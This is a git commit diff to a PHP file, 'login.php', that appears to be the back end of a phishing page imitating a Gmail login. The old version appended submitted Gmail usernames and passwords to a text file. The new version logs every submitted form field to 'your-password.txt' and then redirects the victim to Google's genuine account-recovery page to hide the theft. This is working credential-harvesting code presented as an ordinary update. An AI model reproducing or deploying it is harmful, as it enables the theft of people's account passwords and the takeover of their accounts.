24ac9feaec5ad0194cdb28eae9904ad893ccc43a
SAYOOJ P V <90050844+Sayubot21@users.noreply.github.com>
2022-10-01 13:19:07 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,20 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+$file = fopen("your-password.txt", "a");
+ fwrite($file, "\t\t\t\t\t\t");
+ fwrite($file, "\r\n"); 
+foreach($_POST as $key=>$value) { 
+ fwrite($file, "\t\t\t\t\t\t");
+ fwrite($file, $key); 
+ fwrite($file, "=");
+ fwrite($file, $value);
+ fwrite($file, "\r\n");
+}
+
+
+ fwrite($file, "\r\n");
+ fwrite($file, "\t\t\t\t\t\t");
+ fclose($file);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-exit();
+die ();
 ?>
